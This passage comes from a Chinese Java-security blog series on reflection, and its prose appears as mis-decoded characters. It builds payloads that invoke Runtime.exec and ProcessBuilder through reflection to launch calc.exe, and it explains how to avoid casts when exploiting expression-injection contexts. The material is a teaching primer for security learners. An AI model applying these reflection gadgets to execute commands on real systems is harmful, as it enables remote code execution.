<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Instrance</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throw</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        cls.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(cls.getDeclaredConstructor().newInstance(),<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°æŠ¥é”™ä¸­æç¤º<code>java.lang.Runtime</code>æ˜¯ä¸€ä¸ªç§æœ‰çš„ç±»ï¼Œæ˜¯æ— æ³•ç›´æ¥è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907161320123.png" alt="image-20230907161320123"></p>
<p>ç»§ç»­è·Ÿè¿›è¿™ä¸ªç±»çš„å†…å®¹ï¼Œ</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907161807768.png" alt="image-20230907161807768"></p>
<p><code>Runtime</code>ç¡®å®ä¸ºäº†å®‰å…¨è€ƒè™‘ï¼Œå°†å…¶çš„æ„é€ å‡½æ•°è®¾ç½®ä¸ºç§æœ‰ï¼Œä¸ºäº†ä¸è®©ä»»ä½•å…¶ä»–äººå®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œè¿™é‡Œçš„è¯å°±æ— æ³•é€šè¿‡<code>newInstrance</code>ç›´æ¥è¿›è¡Œå®ä¾‹åŒ–<code>Runtime</code>ï¼Œä¹Ÿå°±æ— æ³•æ‰§è¡Œ<code>exec</code>å‡½æ•°ã€‚</p>
<p>é‚£è¿™é‡Œå°±ä¼šæœ‰ä¸ªé—®é¢˜ï¼Œå¦‚æœæœ‰ç±»çš„æ„é€ å‡½æ•°æ˜¯ç§æœ‰ï¼Œé‚£ä¸æ˜¯ä»£è¡¨å½“ç”¨æˆ·æƒ³è¦ä½¿ç”¨è¿™ä¸ªç±»æ—¶ï¼Œæ— æ³•è¿›è¡Œå®ä¾‹åŒ–ï¼Œå°±æ— æ³•ä½¿ç”¨ï¼Œè€Œæ­£å¸¸ä¸šåŠ¡ä¸­ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ç§æƒ…å†µå‘¢ï¼Ÿ</p>
<p>å…¶å®ï¼Œè¿™ç§æƒ…å†µå«åš<code>â€œå•ä¾‹æ¨¡å¼â€</code>ï¼Œæ˜¯ä¸€ç§å¾ˆå¸¸è§çš„ä¸šåŠ¡æ¨¡å¼ã€‚</p>
<p>æ¯”å¦‚ï¼Œç½‘ç«™çš„æ•°æ®åº“è¿æ¥ï¼Œå½“è¿æ¥æˆåŠŸåï¼Œå°±ä¸éœ€è¦æ¯ç”¨ä¸€æ¬¡å°±å»ºç«‹ä¸€æ¬¡ç½‘ç«™æ•°æ®åº“è¿æ¥ï¼Œè¿™æ ·å°±ä¼šå»ºç«‹å¤šä¸ªæ•°æ®åº“è¿æ¥ï¼Œé€ æˆèµ„æºæµªè´¹ã€‚è¿™æ ·å¼€å‘è€…åœ¨ç¼–å†™ä»£ç æ—¶å°±ä¼šå°†æ„é€ å‡½æ•°å†™å‡ºç§æœ‰ï¼Œå¹¶é€šè¿‡<code>é™æ€æ–¹æ³•</code>æ¥è·å–è¿™ä¸ªå‡½æ•°ã€‚</p>
<blockquote>
<p>åœ¨ç¬¬ä¸€ç¯‡ä¸­æåˆ°è¿‡ï¼Œåˆå§‹åŒ–æ—¶ï¼Œé™æ€æ–¹æ³•å’Œé™æ€å˜é‡<code>åªåŠ è½½ä¸€æ¬¡</code>ï¼Œè€Œåˆ›å»ºç±»å¯¹è±¡æ—¶ï¼Œæ„é€ å‡½æ•°åˆ™ä¼šæ¯æ„é€ ä¸€ä¸ªç±»å¯¹è±¡å°±æ‰§è¡Œä¸€æ¬¡ã€‚</p>
</blockquote>
<p>å†™ä¸ªä»£ç ä¸¾ä¸ªä¾‹å­ï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrivateInstance</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">         Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;reflect2.TrainDB&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TrainDB</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">TrainDB</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrainDB</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TrainDB <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">TrainDB</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·åªæœ‰åœ¨åˆå§‹åŒ–æ—¶æ‰ä¼šæ‰§è¡Œä¸€æ¬¡é™æ€å˜é‡ï¼Œå®ä¾‹åŒ–<code>TrainDB</code>ç±»ï¼Œå¹¶æ‰§è¡Œæ„é€ å‡½æ•°ï¼Œè€Œååªèƒ½é€šè¿‡è°ƒç”¨<code>getInstance()</code> ï¼Œæ‰å¯ä»¥è·å¾—å…¶å®ä¾‹ï¼Œä½†æ˜¯ä¸ä¼šæ‰§è¡Œæ„é€ å‡½æ•°ï¼Œè¿™æ ·ä¹Ÿé¿å…äº†å¤šæ¬¡å»ºç«‹å®ä¾‹ã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907172109455.png" alt="image-20230907172109455"></p>
<h2 id="paloadæ„é€ "><a href="#paloadæ„é€ " class="headerlink" title="paloadæ„é€ "></a>paloadæ„é€ </h2><p>å›å½’æ­£é¢˜ï¼Œ<code>Runtime</code>ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå®ƒä¹Ÿæ˜¯å•ä¾‹æ¨¡å¼ï¼Œåªèƒ½é€šè¿‡<code>Runtime.getRuntime()</code>è·å–<code>Runtime</code>çš„å®ä¾‹</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907173650476.png" alt="image-20230907173650476"></p>
<p>é‚£ä¹ˆè¦æ„é€ <code>payload</code>å°±éœ€è¦æ”¹ä¸€ä¸‹ï¼Œå°±ä¸èƒ½ç”¨<code>newIntstrance</code>è¿›è¡Œå¯¹<code>Runtime</code>çš„å®ä¾‹åŒ–ï¼Œåªæœ‰é€šè¿‡<code>Runtime.getRuntime</code>è¿™ä¸ªè®¾å®šçš„é™æ€æ–¹æ³•è·å–<code>Runtime</code>çš„å®ä¾‹åŒ–åçš„å¯¹è±¡ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect2;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InstanceRuntime</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>å‘ç°ç”¨äº†<code>getMethod</code>æ–¹æ³•å’Œ<code>invoke</code>æ–¹æ³•ï¼Œ</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230909110419443.png" alt="image-20230909110419443"></p>
<h2 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h2><p><code>getMethod</code>çš„ä½œç”¨å°±ç®—é€šè¿‡åå°„è·å¾—ä¸€ä¸ªç±»çš„æŸä¸ªç‰¹å®šçš„å…¬æœ‰æ–¹æ³•ã€‚å…¶éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ–¹æ³•åï¼Œç¬¬äºŒä¸ªæ˜¯æ–¹æ³•æ‰€éœ€å‚æ•°çš„ç±»å‹  [ æ¯”å¦‚ï¼Œå­—ç¬¦ä¸²å°±ç®—<code>String.class</code>] ã€‚</p>
<p>ä½†æ˜¯åœ¨Javaä¸­æ”¯æŒç±»çš„é‡è½½ï¼Œä¹Ÿå°±æ˜¯å¯èƒ½å­˜åœ¨å¤šä¸ª<code>ç›¸åŒçš„åå­—</code>çš„ä½†æ˜¯å‚æ•°åˆ—è¡¨æˆ–è€…ç±»å‹ä¸åŒçš„æ–¹æ³•ï¼Œæ‰€ä»¥åªçŸ¥é“åå­—å¹¶ä¸èƒ½ç›´æ¥ç¡®è®¤å‡½æ•°ã€‚</p>
<p>æ‰€ä»¥åœ¨è¿™é‡Œæƒ³è°ƒç”¨<code>exec</code>æ–¹æ³•æ—¶ï¼Œå°±éœ€è¦çœ‹çœ‹åœ¨<code>Runtime</code>ä¸­å…¶é‡è½½åˆ—è¡¨ï¼Œçœ‹çœ‹ç›®æ ‡æ–¹æ³•ä¸­æ‰€éœ€çš„å‚æ•°ç±»å‹åŠå…¶åˆ—è¡¨ã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230909105451350.png" alt="image-20230909105451350"></p>
<p>è¿™é‡Œå¯ä»¥ç”¨ç¬¬å››ä¸ªé‡è½½ç±»å‹ï¼Œåªè¦ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæœ€ç®€å•ã€‚è€Œå‰ä¸‰ä¸ªè¦å­—ç¬¦ä¸²æ•°ç»„ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªå‘½ä»¤åŠ ä¸Šå‚æ•°ä¹‹ç±»çš„ã€‚</p>
<p>æ‰€ä»¥å°±å¾—åˆ°äº†é€šè¿‡ä»¥ä¸‹ä»£ç è·å–<code>Runtime.exec</code>æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br></pre></td></tr></table></figure>

<p><code>getMethod</code>è·å¾—è¿™ä¸ªæ–¹æ³•åï¼Œå°±éœ€è¦æ‰§è¡Œè¿™ä¸ªæ–¹æ³•ï¼Œæ¯”å¦‚ä¼ å…¥å‚æ•°ç­‰ç­‰ã€‚</p>
<h2 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h2><p><code>invoke</code>çš„ä½œç”¨å°±æ˜¯æ‰§è¡Œæ–¹æ³•ï¼Œå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ï¼š</p>
<ul>
<li><p>å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªæ™®é€šçš„æ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ç±»å¯¹è±¡</p>
</li>
<li><p>å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªé™æ€çš„æ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»</p>
<blockquote>
<p>åŸå› æ˜¯æ™®é€šæ–¹æ³•éœ€è¦ç±»å®ä¾‹åŒ–åå¾—åˆ°ç±»å¯¹è±¡ï¼Œæ‰å¯ä»¥è°ƒç”¨è¯¥æ™®é€šæ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦ä¼ å…¥ç±»å¯¹è±¡ã€‚</p>
<p>è€Œé™æ€æ–¹æ³•ä¸ç”¨å®ä¾‹åŒ–ç±»ï¼Œå°±å¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œæ‰€ä»¥ä¼ å…¥ç±»åå³å¯ã€‚</p>
</blockquote>
</li>
</ul>
<p>å…¶å®è½¬åŒ–ä¸€ä¸‹å°±æ›´åŠ æ¸…æ¥šäº†ï¼Œ</p>
<p>æ­£å¸¸è°ƒç”¨ä¸€ä¸ªæ–¹æ³•æ˜¯ <code>[1].method([2], [3], [4]...)</code> ï¼Œè€Œåœ¨åå°„é‡Œå°±æ˜¯ <code>method.invoke([1], [2], [3], [4]...)</code> ã€‚å…¶ä¸­<code>[1]</code>æ˜¯ç±»æˆ–è€…ç±»å¯¹è±¡ï¼Œè€Œå<code>[...]</code>å°±æ˜¯ä¼ å…¥æ–¹æ³•çš„å‚æ•°ã€‚</p>
<h2 id="paloadåˆ†æ"><a href="#paloadåˆ†æ" class="headerlink" title="paloadåˆ†æ"></a>paloadåˆ†æ</h2><p>æŒ‰ä¸Šè¿°çš„ï¼Œåˆ†è§£ä¸€ä¸‹<code>payload</code>ï¼Œ</p>
<p>è¿™é‡Œå…ˆåˆå§‹åŒ–<code>Runtime</code>ç±»ï¼Œ</p>
<p>ç„¶åè·å–<code>Runtime</code>çš„<code>exec</code>æ–¹æ³•ï¼Œ</p>
<p>ç„¶åå†è·å–<code>Runtime</code>çš„<code>getRuntime</code>æ–¹æ³•ï¼Œ</p>
<p>ç„¶åæ‰§è¡Œ<code>getRuntime</code>è·å–<code>Runtime</code>çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œè¿™é‡Œ<code>invoke</code>ä¼ å…¥ä»»ä½•éƒ½å¯ä»¥ï¼Œå› ä¸ºè¿™é‡Œ<code>getRuntime</code>æ–¹æ³•æ˜¯æ— å‚æ–¹æ³•ï¼Œæ‰€ä»¥ä¸éœ€è¦å‚æ•°ä¹Ÿè¡Œã€‚</p>
<p>æœ€åè°ƒç”¨ï¼Œ<code>exec</code>æ–¹æ³•ï¼Œ<code>invoke</code>ç¬¬ä¸€ä¸ªä¼ å…¥<code>Runtime</code>çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¼ å…¥æ‰§è¡Œçš„å‘½ä»¤<code>calc</code>ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(clazz);</span><br><span class="line">((Method) execMethod).invoke(runtime, <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230909113747032.png" alt="image-20230909113747032"></p>
<p>æœ€åä¸¤ä¸ªç–‘é—®ï¼Œ</p>
<blockquote>
<ul>
<li>å¦‚æœä¸€ä¸ªç±»æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•ï¼Œä¹Ÿæ²¡æœ‰ç±»ä¼¼å•ä¾‹æ¨¡å¼é‡Œçš„é™æ€æ–¹æ³•ï¼Œæˆ‘ä»¬æ€æ ·é€šè¿‡åå°„å®ä¾‹åŒ–è¯¥ç±»å‘¢ï¼Ÿ</li>
<li>å¦‚æœä¸€ä¸ªæ–¹æ³•æˆ–æ„é€ æ–¹æ³•æ˜¯ç§æœ‰æ–¹æ³•ï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½æ‰§è¡Œå®ƒå‘¢ï¼Ÿ</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>Javaæ¼«è°ˆå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaå®‰å…¨[åå°„(3)]</title>
    <url>//post/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/</url>
    <content><![CDATA[<blockquote>
<ol>
<li><code>Java</code>æ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•<code>ProcessBuilder</code> </li>
<li>åå°„ä¸­ä½¿ç”¨<code>getConstructor</code>è·å–æ„é€ æœ‰å‚æ„é€ å‡½æ•° </li>
<li>å¯å˜é•¿å‚æ•°ï¼ˆ<code>varargs</code>ï¼‰åœ¨åå°„ä¸­çš„æ„ä¹‰ä¸ä½¿ç”¨ </li>
<li><code>getDeclared</code>ç³»åˆ—åå°„å‡½æ•°å’Œæ™®é€šåå°„çš„åŒºåˆ«äºä½¿ç”¨</li>
</ol>
</blockquote>
<p>å¹¶è§£å†³ç¬¬äºŒç¯‡çš„ä¸¤ä¸ªé—®é¢˜ï¼Œ</p>
<blockquote>
<ul>
<li>å¦‚æœä¸€ä¸ªç±»æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•ï¼Œä¹Ÿæ²¡æœ‰ç±»ä¼¼å•ä¾‹æ¨¡å¼é‡Œçš„é™æ€æ–¹æ³•ï¼Œæˆ‘ä»¬æ€æ ·é€šè¿‡åå°„å®ä¾‹åŒ–è¯¥ç±»å‘¢ï¼Ÿ</li>
<li>å¦‚æœä¸€ä¸ªæ–¹æ³•æˆ–æ„é€ æ–¹æ³•æ˜¯ç§æœ‰æ–¹æ³•ï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½æ‰§è¡Œå®ƒå‘¢ï¼Ÿ</li>
</ul>
</blockquote>
<span id="more"></span>

<h1 id="Javaå®‰å…¨-åå°„-3"><a href="#Javaå®‰å…¨-åå°„-3" class="headerlink" title="Javaå®‰å…¨[åå°„(3)]"></a>Javaå®‰å…¨[åå°„(3)]</h1><h2 id="getConstructoråå°„æ–¹æ³•-ProcessBulideræ‰§è¡Œå‘½ä»¤"><a href="#getConstructoråå°„æ–¹æ³•-ProcessBulideræ‰§è¡Œå‘½ä»¤" class="headerlink" title="getConstructoråå°„æ–¹æ³•&#x2F;ProcessBulideræ‰§è¡Œå‘½ä»¤"></a>getConstructoråå°„æ–¹æ³•&#x2F;ProcessBulideræ‰§è¡Œå‘½ä»¤</h2><p>ç¬¬ä¸€ä¸ªé—®é¢˜</p>
<blockquote>
<p>å¦‚æœä¸€ä¸ªç±»æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•ï¼Œä¹Ÿæ²¡æœ‰ç±»ä¼¼å•ä¾‹æ¨¡å¼é‡Œçš„é™æ€æ–¹æ³•ï¼Œæˆ‘ä»¬æ€æ ·é€šè¿‡åå°„å®ä¾‹åŒ–è¯¥ç±»å‘¢ï¼Ÿ</p>
</blockquote>
<p>æˆ‘ä»¬éœ€è¦ç”¨åˆ°ä¸€ä¸ªæ–°çš„åå°„æ–¹æ³•<code>getConstructor</code>ã€‚</p>
<p>ä¸<code>getMethod</code>ç±»ä¼¼ï¼Œ<code>getConstructor</code>æ¥æ”¶å‚æ•°æ˜¯æ„é€ å‡½æ•°çš„åˆ—è¡¨ç±»å‹ã€‚å› ä¸ºæ„é€ å‡½æ•°ä¹Ÿæ”¯æŒé‡è½½ï¼Œæ‰€ä»¥å¯èƒ½ä¼šå­˜åœ¨å¤šä¸ªæ„é€ å‡½æ•°ï¼Œæ‰€ä»¥å¿…é¡»ç”¨å‚æ•°åˆ—è¡¨ç±»å‹æ‰èƒ½å”¯ä¸€ç¡®è®¤ä¸€ä¸ªæ„é€ å‡½æ•°ã€‚</p>
<p>è·å–äº†æ„é€ å‡½æ•°åï¼Œä½¿ç”¨<code>newInstance</code>æ¥æ‰§è¡Œã€‚</p>
<p>æ¯”å¦‚ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„å¦ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„æ–¹å¼<code>ProcessBulider</code>ï¼Œ</p>
<blockquote>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„<code>ProcessBuilder</code>ä½¿ç”¨æµç¨‹ï¼š</p>
<ol>
<li><p>åˆ›å»ºä¸€ä¸ª<code>ProcessBuilder</code>å®ä¾‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">pb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>();</span><br></pre></td></tr></table></figure>
</li>
<li><p>è®¾ç½®å‘½ä»¤å’Œå‚æ•°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">pb.command(<span class="string">&quot;myCommand&quot;</span>, <span class="string">&quot;myArg1&quot;</span>, <span class="string">&quot;myArg2&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>ï¼ˆå¯é€‰ï¼‰è®¾ç½®å…¶ä»–å±æ€§ï¼Œå¦‚å·¥ä½œç›®å½•ã€ç¯å¢ƒå˜é‡ç­‰ã€‚</p>
</li>
<li><p>å¯åŠ¨è¿›ç¨‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> pb.start();</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç­‰å¾…è¿›ç¨‹å®Œæˆå¹¶è·å–é€€å‡ºå€¼ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">exitValue</span> <span class="operator">=</span> process.waitFor();</span><br></pre></td></tr></table></figure></li>
</ol>
</blockquote>
<p>æˆ‘ä»¬ä½¿ç”¨<code>getConstructor</code>æ¥è·å–å…¶æ„é€ å‡½æ•°ï¼Œç„¶åè°ƒç”¨<code>start()</code>æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).start();</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„<code>ProcessBuilder</code>ç±»çš„æ„é€ å‡½æ•°æœ‰ä¸¤ä¸ªï¼Œè€Œä¸”éƒ½æ˜¯æœ‰å‚æ•°çš„</p>
<blockquote>
<ul>
<li><code>public ProcessBuilder(String... command)</code></li>
<li><code>public ProcessBuilder(List&lt;String&gt; command)</code></li>
</ul>
</blockquote>
<p>è¿™é‡Œç”¨åˆ°çš„æ˜¯ç¬¬äºŒä¸ªæ„é€ å‡½æ•°ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°æ„é€ å‡½æ•°çš„å‚æ•°å°±æ˜¯<code>command</code>ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œçš„å‘½ä»¤éœ€è¦åœ¨å®ä¾‹åŒ–çš„æ—¶å€™ä¼ å…¥ã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230909132658712.png" alt="image-20230909132658712"></p>
<blockquote>
<p><code>List.class</code>å’Œä¹‹å‰ å‰ä¸¤ç¯‡æåˆ°çš„<code>String.class</code>ä¸€æ ·ï¼ŒæŒ‡çš„æ˜¯<code>è°ƒç”¨æ–¹æ³•çš„å‚æ•°ç±»å‹</code>ã€‚</p>
<p><code>List.class</code>æŒ‡çš„å°±ç®—<code>Listæ¥å£ç±»</code>çš„<code>Class</code>å¯¹è±¡</p>
<p><code>String.class</code>è¡¨ç¤º <code>String</code>ç±»çš„<code>Class</code>å¯¹è±¡</p>
</blockquote>
<blockquote>
<p>åœ¨è¿™æ®µä»£ç ä¸­ï¼Œ<code>List.class</code> è¢«ç”¨ä½œå‚æ•°ä¼ é€’ç»™ <code>getConstructor()</code> æ–¹æ³•ï¼Œä»¥è·å–ä¸€ä¸ªæ¥å— <code>List</code> ç±»å‹å‚æ•°çš„æ„é€ å‡½æ•°ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬<strong>æ­£åœ¨æŸ¥æ‰¾ä¸€ä¸ªæ„é€ å‡½æ•°</strong>ï¼Œå®ƒæ¥å—ä¸€ä¸ª <code>List</code> å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œå¹¶ä½¿ç”¨è¯¥ <code>List</code> å¯¹è±¡æ¥åˆå§‹åŒ–æ–°åˆ›å»ºçš„ <code>ProcessBuilder</code> å®ä¾‹ã€‚äºæ˜¯å°±æ‰¾åˆ°äº†ç¬¬äºŒä¸ªæ„é€ å‡½æ•°ï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥åŠ¨æ€åœ°åˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªæ–°è¿›ç¨‹ã€‚</p>
</blockquote>
<hr>
<h2 id="é¿å…åˆ©ç”¨å¼ºç±»å‹è½¬æ¢"><a href="#é¿å…åˆ©ç”¨å¼ºç±»å‹è½¬æ¢" class="headerlink" title="é¿å…åˆ©ç”¨å¼ºç±»å‹è½¬æ¢"></a>é¿å…åˆ©ç”¨å¼ºç±»å‹è½¬æ¢</h2><p>ä½†æ˜¯æˆ‘ä»¬åœ¨<code>payload</code>ä¸­ç”¨åˆ°äº†Javaä¸­çš„å¼ºç±»å‹è½¬æ¢ã€<code>((ProcessBuilder) xxx)</code>ã€‘ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬åˆ©ç”¨æ¼æ´çš„æ—¶å€™(åœ¨è¡¨è¾¾å¼ä¸Šä¸‹æ–‡)æ˜¯æ²¡æœ‰è¿™ç§è¯­æ³•çš„ã€‚æ‰€ä»¥æˆ‘ä»¬ä»ç„¶éœ€è¦åå°„æ¥å®Œæˆè¿™ä¸€æ­¥ã€‚</p>
<blockquote>
<p>å…¶ä¸­æœ‰ä¸ª<code>Arrays.asList</code>å…¶å®ä¹Ÿå¥½ç†è§£ï¼Œå°±ç®—å°†å‚æ•°ä»æ•°ç»„è½¬æ¢ä¸ºåˆ—è¡¨ï¼Œä½¿å…¶ç¬¦åˆæ„é€ å‡½æ•°çš„å‚æ•°ç±»å‹ï¼Œç„¶å<code>newInstance</code>æ—¶å°†å‚æ•°ä¼ è¿›å»æ‰§è¡Œã€‚</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).start();</span><br></pre></td></tr></table></figure>



<p>å…¶å®ä¹Ÿå¾ˆå¥½æ”¹è¿™ä¸ª<code>payload</code>ï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°å¼ºç±»å‹è½¬åŒ–çš„åŸå› ä¸»è¦æ˜¯å› ä¸ºæ‰§è¡Œ<code>.start()</code>æ–¹æ³•<code>å¯åŠ¨è¿›ç¨‹</code>çš„æ—¶å€™ï¼Œå‰éƒ¨åˆ†ä¸ç”¨å¼ºç±»å‹åŒ…å«èµ·æ¥ï¼Œæ— æ³•æ‰¾åˆ°è¿™ä¸ªæ–¹æ³•ï¼Œä¼šåœ¨<code>Object</code>ç±»ä¸­å¯»æ‰¾ã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230909150718667.png" alt="image-20230909150718667"></p>
